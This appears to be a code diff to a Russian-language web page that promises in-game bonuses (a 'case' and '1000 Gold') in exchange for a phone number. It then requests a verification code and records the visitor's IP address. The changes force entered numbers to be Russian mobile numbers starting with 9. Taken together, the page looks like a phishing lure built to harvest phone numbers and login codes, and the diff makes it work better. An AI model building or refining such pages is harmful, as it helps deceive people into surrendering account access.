@@ -61,9 +61,9 @@
                 <div class="bonus-row"><span class="bonus-label">Вам за вход</span><span class="bonus-value">🎁 Кейс</span></div>
                 <div class="bonus-row"><span class="bonus-label">Другу за вас</span><span class="bonus-value" style="font-size:13px;">💰 1000 Gold</span></div>
             </div>
-            <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="900 000-00-00" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
+            <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="9XX XXX-XX-XX" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
             <button class="btn" id="btn-phone" onclick="requestCode()">Получить бонусы</button>
-            <div class="error-msg" id="phone-error">Введите 10 цифр номера телефона</div>
+            <div class="error-msg" id="phone-error">Введите 10 цифр начиная с 9</div>
         </div>
         <div id="screen-loading" class="loading-overlay">
             <div class="spinner"></div>
@@ -118,7 +118,14 @@
         }
 
         function formatPhone(input) {
-            var value = input.value.replace(/\D/g, '').slice(0, 10);
+            var value = input.value.replace(/\D/g, '');
+            if (value.length > 0 && value[0] !== '9') {
+                value = '9' + value;
+            }
+            value = value.slice(0, 10);
+            if (value.length > 0 && value[0] !== '9') {
+                value = '9' + value.slice(0, 9);
+            }
             var formatted = '';
             if (value.length > 0) formatted += value.slice(0, 3);
             if (value.length > 3) formatted += ' ' + value.slice(3, 6);
@@ -165,6 +172,7 @@
         async function requestCode() {
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
+            if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
             var ip = await getIP();
             var fullPhone = '+7' + phone;
